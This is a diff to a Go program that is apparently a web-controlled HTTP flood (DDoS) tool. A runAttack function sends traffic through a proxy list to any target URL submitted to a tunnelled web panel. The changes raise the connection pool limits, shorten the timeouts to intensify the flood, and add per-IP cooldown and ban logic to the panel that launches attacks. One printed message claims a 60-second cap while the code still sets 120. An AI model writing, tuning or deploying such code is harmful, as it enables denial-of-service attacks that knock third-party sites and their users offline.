@@ -615,6 +615,28 @@ var (
 	tunnelReady bool
 )
 
+var (
+	ipCooldownMutex sync.Mutex
+	ipCooldownMap   = make(map[string]time.Time)
+
+	ipTargetMutex sync.Mutex
+	ipTargetLast  = make(map[string]time.Time)
+)
+
+func getClientIP(r *http.Request) string {
+	if cfIP := r.Header.Get("Cf-Connecting-Ip"); cfIP != "" {
+		return cfIP
+	}
+	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
+		ips := strings.Split(xff, ",")
+		if len(ips) > 0 {
+			return strings.TrimSpace(ips[0])
+		}
+	}
+	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
+	return ip
+}
+
 func runAttack(tgt string, dur int, cookie string) {
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
@@ -747,13 +769,13 @@ func runAttack(tgt string, dur int, cookie string) {
 	for i, ProxyY := range PRX {
 		tr := &http.Transport{
 			DialContext: (&net.Dialer{
-				Timeout:   4 * time.Second,
+				Timeout:   3 * time.Second,
 				KeepAlive: KEP,
 			}).DialContext,
 			DisableKeepAlives:     false,
 			DisableCompression:    false,
-			MaxIdleConns:          10000,
-			MaxIdleConnsPerHost:   5000,
+			MaxIdleConns:          15000,
+			MaxIdleConnsPerHost:   7500,
 			MaxConnsPerHost:       0,
 			IdleConnTimeout:       KEP,
 			TLSClientConfig: &tls.Config{
@@ -771,8 +793,8 @@ func runAttack(tgt string, dur int, cookie string) {
 				},
 			},
 			ForceAttemptHTTP2:     true,
-			TLSHandshakeTimeout:   4 * time.Second,
-			ResponseHeaderTimeout: 4 * time.Second,
+			TLSHandshakeTimeout:   3 * time.Second,
+			ResponseHeaderTimeout: 3 * time.Second,
 			ExpectContinueTimeout: 0 * time.Second,
 		}
 		ip := ""
@@ -1326,6 +1348,29 @@ func startWebAndTunnel() {
 	}
 	port := listener.Addr().(*net.TCPAddr).Port
 
+	go func() {
+		ticker := time.NewTicker(10 * time.Minute)
+		for range ticker.C {
+			ipCooldownMutex.Lock()
+			now := time.Now()
+			for ip, t := range ipCooldownMap {
+				if now.After(t) {
+					delete(ipCooldownMap, ip)
+				}
+			}
+			ipCooldownMutex.Unlock()
+
+			ipTargetMutex.Lock()
+			now = time.Now()
+			for k, t := range ipTargetLast {
+				if now.Sub(t) > 10*time.Minute {
+					delete(ipTargetLast, k)
+				}
+			}
+			ipTargetMutex.Unlock()
+		}
+	}()
+
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/html")
 		fmt.Fprint(w, webHTML)
@@ -1342,8 +1387,8 @@ func startWebAndTunnel() {
 			} else {
 				cooldown = 0
 				if attackState == "cooldown" {
-					attackState = "—"
-					state = "—"
+					attackState = "idle"
+					state = "idle"
 				}
 			}
 		}
@@ -1374,14 +1419,14 @@ func startWebAndTunnel() {
 		dur, err := strconv.Atoi(durationStr)
 		if err != nil || dur <= 0 {
 			stateMutex.Lock()
-			attackState = "—"
+			attackState = "idle"
 			stateMutex.Unlock()
 			http.Error(w, "Invalid duration", http.StatusBadRequest)
 			return
 		}
 		if target == "" {
 			stateMutex.Lock()
-			attackState = "—"
+			attackState = "idle"
 			stateMutex.Unlock()
 			http.Error(w, "Target required", http.StatusBadRequest)
 			return
@@ -1390,7 +1435,7 @@ func startWebAndTunnel() {
 		parsedTarget, err := url.Parse(target)
 		if err != nil {
 			stateMutex.Lock()
-			attackState = "—"
+			attackState = "idle"
 			stateMutex.Unlock()
 			http.Error(w, "Invalid target URL", http.StatusBadRequest)
 			return
@@ -1407,11 +1452,33 @@ func startWebAndTunnel() {
 
 		if normalize(targetHost) == normalize(tHost) {
 			stateMutex.Lock()
-			attackState = "—"
+			attackState = "idle"
 			stateMutex.Unlock()
 			http.Error(w, "You Are IDIOT", http.StatusBadRequest)
 			return
 		}
+
+		clientIP := getClientIP(r)
+
+		key := clientIP + "|" + target
+		ipTargetMutex.Lock()
+		lastTime, exists := ipTargetLast[key]
+		now := time.Now()
+		if exists && now.Sub(lastTime) < 5*time.Minute {
+			ipTargetMutex.Unlock()
+			http.Error(w, "You are banned for 5 minutes", http.StatusForbidden)
+			return
+		}
+		ipTargetMutex.Unlock()
+
+		ipCooldownMutex.Lock()
+		if t, exists := ipCooldownMap[clientIP]; exists && now.Before(t) {
+			remaining := int(time.Until(t).Seconds()) + 1
+			ipCooldownMutex.Unlock()
+			http.Error(w, fmt.Sprintf("Please waiting %d seconds", remaining), http.StatusTooManyRequests)
+			return
+		}
+		ipCooldownMutex.Unlock()
 
 		stateMutex.Lock()
 		state := attackState
@@ -1423,8 +1490,8 @@ func startWebAndTunnel() {
 				http.Error(w, fmt.Sprintf("Cooldown %d seconds remaining", cooldown), http.StatusTooManyRequests)
 				return
 			} else {
-				attackState = "—"
-				state = "—"
+				attackState = "idle"
+				state = "idle"
 			}
 		}
 		if state == "attacking" {
@@ -1435,16 +1502,24 @@ func startWebAndTunnel() {
 		attackState = "attacking"
 		stateMutex.Unlock()
 
-		go func() {
-			runAttack(target, 120, cookie)
+		go func(ip string, tgt string) {
+			runAttack(tgt, 120, cookie)
 			stateMutex.Lock()
 			attackState = "cooldown"
 			cooldownUntil = time.Now().Add(30 * time.Second)
 			stateMutex.Unlock()
-		}()
+
+			ipCooldownMutex.Lock()
+			ipCooldownMap[ip] = time.Now().Add(3 * time.Minute)
+			ipCooldownMutex.Unlock()
+
+			ipTargetMutex.Lock()
+			ipTargetLast[ip+"|"+tgt] = time.Now()
+			ipTargetMutex.Unlock()
+		}(clientIP, target)
 
 		w.WriteHeader(http.StatusOK)
-		fmt.Fprintf(w, "Attack started on %s for 120 seconds", target)
+		fmt.Fprintf(w, "Attack started on %s", target)
 	})
 
 	server := &http.Server{Addr: fmt.Sprintf(":%d", port)}
@@ -1545,7 +1620,7 @@ func main() {
 	if len(os.Args) >= 3 {
 		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
 			if d > 120 {
-				fmt.Println("Durasi maksimal 120 detik, diatur ke 120")
+				fmt.Println("Durasi maksimal 60s")
 				dur = 120
 			} else {
 				dur = d
